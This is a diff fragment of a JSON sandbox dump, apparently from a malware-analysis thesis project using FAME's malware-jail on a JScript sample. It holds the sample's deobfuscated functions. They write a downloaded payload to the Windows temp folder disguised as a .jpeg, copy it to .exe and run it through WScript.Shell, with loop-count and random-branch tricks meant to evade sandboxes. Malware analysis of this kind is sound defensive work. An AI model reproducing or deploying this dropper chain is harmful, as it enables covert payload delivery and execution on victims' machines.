+    "crearArchivoEnCarpeta_Antes_qdwsFVTbp": "function crearArchivoEnCarpeta_Antes_qdwsFVTbp() {\r\n    try {\r\n        var objetoFileSystemObject = new ActiveXObject('Scripting.FileSystemObject');\r\n        var stringAleatorio_Antes_OSD = Math.random().toString(36); // Crea un string aleatorio del estilo: \"0.5ll6h8fqs5o\"\r\n        var nombreArchivo_Antes_wime = stringAleatorio_Antes_OSD.substr(2, 9) + \".jpeg\"; // crea un nombre para un archivo jpeg del estilo:\r\n        var rutaArchivo_Antes_EGqWqhgSpd = \"\\\\\" + nombreArchivo_antes_wime;             // del estilo: 5ll6h8fqs5o.jpeg\r\n        var rutaCarpeta_Antes_IrFXRl = objetoFileSystemObject.GetSpecialFolder(2) + rutaArchivo_Antes_EGqWqhgSpd;\r\n        return rutaCarpeta_Antes_IrFXRl;\r\n    } catch(error) { util_log(_sc + _inspect(error));\r\n        return false;\r\n    }\r\n}",
+    "escribirArchivo_Antes_cT": "function escribirArchivo_Antes_cT(objetoXMLHTTPResponseBody, rutaArchivo_Antes_YXai) {\r\n    var objetoStream = new ActiveXObject('ADODB.Stream');\r\n    objetoStream.Open();\r\n    objetoStream.Type = 1; \r\n    objetoStream.Write(objetoXMLHTTPResponseBody);\r\n    objetoStream.Position = 0;\r\n    objetoStream.SaveToFile(rutaArchivo_Antes_YXai, 2);\r\n    objetoStream.Close();\r\n    return true;\r\n}",
+    "KLFZ": "function KLFZ(rutaArchivoCreado) {\r\n    var elementoArray = elementoRandomArray_Antes_XjeKDZgGZf(['return ds', 'sdfd', 'new ActiveXObject(\"WScript.Shell\")']);\r\n    var contador = 0;\r\n\r\n    function yVgesNA() {\r\n        bifurcaPrograma_Antes_XjXSc(rutaArchivoCreado, elementoArray);\r\n        contador++;\r\n        if (contador > 100007) {\r\n            // Solo se entra desde la traza B\r\n            cambiarExtensionArchivo_Antes_WPWHF(rutaArchivoCreado, function(rutaArchivoCreadoExe) {\r\n                ejecutaMalware_Antes_wf(rutaArchivoCreadoExe)\r\n            });\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n    var resultadoXjXSc = bifurcaPrograma_Antes_XjXSc(rutaArchivoCreado, elementoArray);\r\n    var i = 0;\r\n    // Traza A - Ejecuta yVgesNA -> XjXSc y acaba\r\n    // Traza B - Ejecuta yVgesNA 100007 veces y a la 100008 -> cambiarExtensionArchivo_Antes_WPWHF y yVgesNA\r\n    do {  \r\n        i = resultadoXjXSc;\r\n        var resultado_yVgesNA = yVgesNA();\r\n        if (resultado_yVgesNA) {\r\n            break;\r\n        }\r\n    } while (i < 1);\r\n}",
+    "elementoRandomArray_Antes_XjeKDZgGZf": "function elementoRandomArray_Antes_XjeKDZgGZf(array) {\r\n    return array[Math.floor((Math.random() * array.length))];\r\n}",
+    "bifurcaPrograma_Antes_XjXSc": "function bifurcaPrograma_Antes_XjXSc(rutaArchivoCreado, elementoArray) {\r\n    var varDevolver = 0;\r\n    for (var i = 0; i < 10; i++) {\r\n        var stringAux = elementoArray;\r\n        if (~stringAux.indexOf('cript')) { \r\n            varDevolver = 1;\r\n            cambiarExtensionArchivo_Antes_WPWHF(rutaArchivoCreado, function(rutaArchivoCreadoExe) \r\n            {\r\n                ejecutaMalware_Antes_BO(elementoArray, rutaArchivoCreadoExe);\r\n            });\r\n        }\r\n    }\r\n    return varDevolver;\r\n}",
+    "cambiarExtensionArchivo_Antes_WPWHF": "function cambiarExtensionArchivo_Antes_WPWHF(rutaArchivoCreado, callback_Antes_aiIWKbgoz) {\r\n    try {\r\n        var objetoFileSystemObject = new ActiveXObject('Scripting.FileSystemObject');\r\n        var nuevaRuta = rutaArchivoCreado.replace('.jpeg', '.exe');\r\n        objetoFileSystemObject.CopyFile(rutaArchivoCreado, nuevaRuta);\r\n        return callback_Antes_aiIWKbgoz(nuevaRuta);\r\n    } catch(e) { util_log(_sc + _inspect(e));\r\n        return null;\r\n    }\r\n}",
+    "ejecutaMalware_Antes_BO": "function ejecutaMalware_Antes_BO(elementoArray, rutaArchivoCreadoExe) {\r\n    var objetoWScriptShell = elementoArray ;\r\n    objetoWScriptShell.Run(rutaArchivoCreadoExe);\r\n}",
+    "ejecutaMalware_Antes_wf": "function ejecutaMalware_Antes_wf(rutaArchivoCreadoExe) {\r\n    var stringShell = \"WScript.Shell\";\r\n    var objetoWScriptShell = new ActiveXObject(stringShell);\r\n    objetoWScriptShell.Run(rutaArchivoCreadoExe);\r\n}",
+    "_config": {
+        "sandbox_sequence1": [
+            "fame/modules/community/processing/malware_jail/malware-jail/env/eval.js",
+            "fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js"
+        ],
+        "sandbox_sequence": [
+            "fame/modules/community/processing/malware_jail/malware-jail/env/utils.js",
+            "fame/modules/community/processing/malware_jail/malware-jail/env/eval.js",
+            "fame/modules/community/processing/malware_jail/malware-jail/env/function.js",
+            "fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js",
+            "fame/modules/community/processing/malware_jail/malware-jail/env/browser.js",
+            "fame/modules/community/processing/malware_jail/malware-jail/env/agents.js",
+            "fame/modules/community/processing/malware_jail/malware-jail/env/other.js",
+            "fame/modules/community/processing/malware_jail/malware-jail/env/console.js"
+        ],
+        "browser_type": "IE8",
+        "malware_files": [
+            "/home/maik/gitHub/TFM/fame/storage/946446c87072f2c76200db9323cc1f84d5df40682380dd80ac08a94614126a43/cryxosOrdenado.js"
+        ],
+        "context_dump_after": "fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json",
+        "save_files": "fame/modules/community/processing/malware_jail/malware-jail/output/",
+        "timeout": 60000
+    },
+    "_arguments": "/home/maik/gitHub/TFM/fame/storage/946446c87072f2c76200db9323cc1f84d5df40682380dd80ac08a94614126a43/cryxosOrdenado.js"
+}
